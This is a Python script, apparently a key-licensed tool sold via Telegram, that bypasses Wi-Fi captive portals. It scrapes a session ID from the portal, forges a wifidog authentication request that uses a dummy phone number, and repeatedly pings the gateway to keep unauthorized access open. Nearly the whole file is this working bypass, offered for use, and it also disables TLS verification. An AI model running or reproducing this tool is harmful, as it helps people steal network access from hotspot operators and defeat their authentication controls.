"""
Turbo Network Engine - With Key Approval System
Pro Terminal Edition
"""

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Color Definitions
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
bwhite = "\033[1;37m"
reset = "\033[00m"

SHEET_ID = "1NbVavISCyYEL5AfEs3QYM1qm1GJDXAZHLcU5t8etf3k"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    """Get unique system key for this device"""
    try:
        uid = os.geteuid()
    except AttributeError:
        uid = 1000
    try:
        username = os.getlogin()
    except:
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    """Fetch authorized keys from Google Sheets"""
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key: keys.append(key)
            if keys:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        f.write('\n'.join(keys))
                except: pass
            return keys
    except: pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
    except: pass
    return keys

def check_approval():
    """Check if system key is approved with new Banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{bpurple}⚡ INITIALIZING KEY VERIFICATION SYSTEM ⚡{reset}")
    print(f"{white}──────────────────────────────────────────────────────{reset}")
    
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    
    print(f"{bblue}[i]{reset} System Fingerprint : {byellow}{system_key}{reset}")
    print(f"{bblue}[i]{reset} Server Connection  : {bgreen}Online{reset}")
    
    if system_key in authorized_keys:
        print(f"\n{bgreen}✅ ACCESS GRANTED - WELCOME BACK USER{reset}")
        print(f"{white}──────────────────────────────────────────────────────{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}╔══════════════════════════════════════════╗")
        print(f"║           ❌ ACCESS DENIED ❌            ║")
        print(f"╚══════════════════════════════════════════╝{reset}")
        print(f"{white}\n      Please contact Admin for access.{reset}")
        print(f"{green}╔══════════════════════════════════════════╗")
        print(f"║{cyan}          TELEGRAM: @Su_Ye_21             {yellow}║")
        print(f"╚══════════════════════════════════════════╝{reset}")
        return False

def banner():
    """Main Pro Engine Banner"""
    print(f"""
{bgreen}╔══════════════════════════════════════════╗
║{bgreen}          [ ✓ KEY APPROVED ✓ ]            {bcyan}║
╚══════════════════════════════════════════╝{reset}""")

# Configs
PING_THREADS = 2
MIN_INTERVAL = 0.5
MAX_INTERVAL = 1.0
DEBUG = False
stop_event = threading.Event()

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")

def check_real_internet():
    try: return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    ping_count = 0
    success_count = 0
    while not stop_event.is_set():
        try:
            start = time.time()
            r = session.get(auth_link, timeout=5)
            elapsed = (time.time() - start) * 1000
            ping_count += 1
            success_count += 1
            color = bgreen if elapsed < 50 else byellow if elapsed < 100 else bred
            print(f"{color}[✓]{reset} SID {sid[:8]}.. | Ping: {elapsed:.1f}ms | Success: {success_count}/{ping_count}   ", end="\r")
        except Exception:
            ping_count += 1
            print(f"{bred}[X]{reset} SID {sid[:8]}.. | Connection Lost | Success: {success_count}/{ping_count}   ", end="\r")
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    logging.info(f"{bwhite}Initializing Turbo Engine...{reset}")
    
    if check_real_internet():
        print(f"{bgreen}[•] Internet Already Active... Monitoring status.{reset}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url and check_real_internet():
                time.sleep(5)
                continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            print(f"\n{bcyan}[*] Captive Portal Detected: {portal_host}{reset}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                time.sleep(5); continue

            print(f"{bgreen}[✓]{reset} Session ID Captured: {sid}")
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"{bpurple}[*] Launching Turbo Threads...{reset}")
            for i in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            last_status = False
            while not stop_event.is_set():
                is_connected = check_real_internet()
                if is_connected and not last_status:
                    print(f"\n{bgreen}[✓] Internet Connected Successfully!{reset}")
                elif not is_connected and last_status:
                    print(f"\n{bred}[X] Connection Dropped! Re-scanning...{reset}")
                    break
                last_status = is_connected
                time.sleep(2)
        except KeyboardInterrupt: raise
        except Exception: time.sleep(5)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"\n{bgreen}Your System Key: {byellow}{get_system_key()}{reset}")
        print(f"{bwhite}Send this key to {bcyan}@Su_Ye_21{bwhite} to get access.{reset}")
        sys.exit(0)
    
    if check_approval():
        try:
            start_process()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{bred}Turbo Engine Shutdown...{reset}")
    else:
        sys.exit(1)